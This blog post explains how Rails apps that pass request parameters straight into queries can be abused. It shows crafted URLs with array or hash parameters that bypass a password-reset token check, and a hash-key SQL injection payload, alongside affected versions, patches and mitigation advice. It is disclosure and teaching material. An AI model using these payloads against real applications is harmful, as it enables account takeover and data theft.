---
layout: post
title: "Abusing Dynamic Types For Fun And Profit"
date: "2012-05-15 11:39"
comments: true
categories: [Rails, Security]
---

Most Rails applications don't properly sanitise user input when passing it to queries (UPDATE: Rails has fixed the problems raised in this article so it was mostly a Rails problem rather than an application programmer problem). I'm going to use an example to illustrate this problem.

The Scenario
------------

Johnny has been tasked to add a password reset feature to his Rails application. So he adds a reset_token to his User model and a PasswordsController class to the application. When the user forgets their password they type in their email and a reset_token is generated and saved on the User model and a url containing the reset token is sent to the users email address. The url looks like `/users/1/passwords/edit?reset_token=kjksldjflskdjf`. This reset token is then checked when the user resets their password. Johnny writes the following code in the PasswordsController:

``` ruby  
def update
  @user = User.find_by_id_and_reset_token(
                 params[:user_id], params[:reset_token])

  if @user.update_password(params[:user][:password])
    redirect_to(url_after_update)
  else
    flash_failure_after_update
    render :template => 'passwords/edit'
  end
end
```

Johnny deploys this new feature to the staging environment and Mary is given the task to test it. Now Mary is quite clever and checks what happens if she removes the reset_token parameter from the url and changes the user id. She visits the url `/users/2/passwords/edit` and finds that she can change the password for any user that has not requested their password to be reset. She raises this as a critical bug.

Johnny reproduces the problem on his machine and notices it is is doing the following query:

```
User Load (0.2ms)  SELECT `users`.* FROM `users` WHERE `users`.`id` = 2 
  AND `users`.`reset_token` IS NULL LIMIT 1
```

He realises he needs to stop users from not sending the reset_token parameter because if `params[:reset_token]` is `nil` then they can update any user who hasn't requested a password reset. He updates the code in PasswordController to the following:

``` ruby 
def update

  if params[:reset_token].blank?
    flash_failure_after_update
    render :template => 'passwords/edit'
    return
  end

  @user = User.find_by_id_and_reset_token(
                 params[:user_id], params[:reset_token])

  if @user.update_password(params[:user][:password])
    redirect_to(url_after_update)
  else
    flash_failure_after_update
    render :template => 'passwords/edit'
  end
end
```

Mary tries her trick again but it doesn't work this time. But Mary has more tricks in her bag and this time she uses the url `/users/2/passwords/edit?reset_token[]` . Again she is able to change the password for any user that has not had a reset_token generated. 

Johnny reproduces the problem on his machine and sees it doing the same query:

```
User Load (0.2ms)  SELECT `users`.* FROM `users` WHERE `users`.`id` = 2 
  AND `users`.`reset_token` IS NULL LIMIT 1
```

Johnny is completely stumped as to how nil.blank? could be false. He adds some logging and finds the `params[:reset_token]` is actually an array containing a nil element: `[nil]`. He decides to fix the problem by calling `to_s` on the query parameters.

``` ruby 
def update

  if params[:reset_token].blank?
    flash_failure_after_update
    render :template => 'passwords/edit'
    return
  end

  @user = User.find_by_id_and_reset_token(
                 params[:user_id].to_s, params[:reset_token].to_s)

  if @user.update_password(params[:user][:password])
    redirect_to(url_after_update)
  else
    flash_failure_after_update
    render :template => 'passwords/edit'
  end
end
```

Not Just Arrays (SQL Manipulation)
----------------------------------

If Johnny had a used the `where` function instead of `find_by_` then an attacker could have exploited it by passing in a `Hash` instead of an `Array`. 

``` ruby
def update

  if params[:reset_token].blank?
    flash_failure_after_update
    render :template => 'passwords/edit'
    return
  end

  @user = User.where(:id => params[:user_id], :reset_token => params[:reset_token]).limit(1).first

  if @user.update_password(params[:user][:password])
    redirect_to(url_after_update)
  else
    flash_failure_after_update
    render :template => 'passwords/edit'
  end
end
```

For example Mary could of sent the url `/users/2/passwords/edit?reset_token[users.id]=2`. The query then performed would have been:

```
User Load (0.2ms)  SELECT `users`.* FROM `users` WHERE `users`.`id` = 2 
  AND `users`.`id` = 2 LIMIT 1
```

The user is able to change the token filter to a filter on a column of their choice. On previous versions of Rails this attack can be escalated
to arbitrary SQL injection. This attack uses the [previously fixed issue](https://groups.google.com/group/rubyonrails-security/browse_thread/thread/6a1e473744bc389b) of SQL injection in table names and columns. This bug was originally not
as serious because you would not normally let a user choose arbitrary columns or table names in a query. However, with the SQL Manipulation bug an
attacker is now able to change table and column names to perform SQL injection.

```
params[:role_id] = {"user_details.id` = 1 or 1 = 1); -- " => 1}
UserDetail.find(:all, :conditions => {:role_id => params[:role_id]})

UserDetail Load (0.5ms)   SELECT * FROM `users` WHERE
(`user_details`.`id` = 1 or 1 = 1); -- ` = 1)
```

This `Hash` problem is actually a security bug in rails and the rails team has released a patch for it. 

Underlying Problem
------------------

The problem is developers expect the user input to be a `String` but it can also be an `Array` or a `Hash` and Rails has quite different behaviour if a `Hash` or an `Array` is passed in. The `Hash` is particularly troubling because if you have a filter on column X then a user can change it to be a filter on column Y. Example:

``` ruby
irb(main):001:0> User.where(:id => 1, :confirmation_token => "foo")
  User Load (0.4ms)  SELECT `users`.* FROM `users` WHERE `users`.`id` = 1 
    AND `users`.`confirmation_token` = 'foo'
=> []
```

```ruby
irb(main):002:0> User.where(:id => 1, :confirmation_token => {"users.id" => "1"})
  User Load (0.4ms)  SELECT `users`.* FROM `users` WHERE `users`.`id` = 1 
    AND `users`.`id` = 1
=> [#<User id: 1, email: "benmmurphy@gmail.com", encrypted_password: "f1fcf94f12b17a447e1c4a98ba2bae934aacabb7", salt: "abcb87e3031102d110cf87734d39d8a1e6d8c03e", confirmation_token: nil, remember_token: "975dc5fb3524a90f1a6aff4c1a111d2cd8bfcc50", created_at: "2012-05-15 08:28:01", updated_at: "2012-05-15 08:28:01">]
```

This `Hash` trick only seems to work on `where` filterings and not `find_by` methods:

```ruby
irb(main):006:0> User.find_by_id_and_confirmation_token(1, {"users.id" => "1"})
ArgumentError: Unknown key: users.id
  from /Users/benmurphy/.rbenv/versions/1.9.2-p290/lib/ruby/gems/1.9.1/gems/activesupport-3.2.2/lib/active_support/core_ext/hash/keys.rb:44:in `block in assert_valid_keys'
```

Vulnerable Code
---------------

* https://github.com/thoughtbot/clearance - Possible to change any users password.
* Rails ( 2.3.x, < 3.2.6, <3.1.6, < 3.0.14) SQL manipulation anywhere there is use of `where()` or `find()` that takes user input. 
* Rails (< 2.3.13, 3.0.10, 3.1.0.rc5) arbitrary SQL injection where SQL manipulation can be performed.

Fixes
-----
* Rails has released 3.2.6 that fixes both the nil issue and SQL manipulation/injection problems with `Hash`.
* Clearance has released 

Mitigation
----------

It is recommended that you install the Rails patches to fix the `Hash` problem and nil problem. Also, with security sensitive code I strongly recommend all query
parameters be coerced to the type you expect them to be. For example if you expect a parameter to be a `String` you should call `to_s` on it.

Previous Work
-------------

The Devise team seem to have been aware of the general problem of users being able to send non-string parameters. They have a `ParamFilter` 
class that forces all parameters to be `String`s. It looks like they did this because they had an injection problem with mongoid.

```ruby ParamFilter https://github.com/plataformatec/devise/blob/master/lib/devise/param_filter.rb#L26
# Force keys to be string to avoid injection on mongoid related database.
def stringify_params(conditions)
  return conditions unless conditions.is_a?(Hash)
  conditions.each do |k, v|
    conditions[k] = v.to_s if param_requires_string_conversion?(v)
  end
end
```

Stay Tuned
----------

We only covered the issues fixed in 3.2.5 and 3.2.4 in this article. There was another variant of the `Hash` attack that was fixed in 3.2.6. I will cover 
that in a future article and show how to exploit it.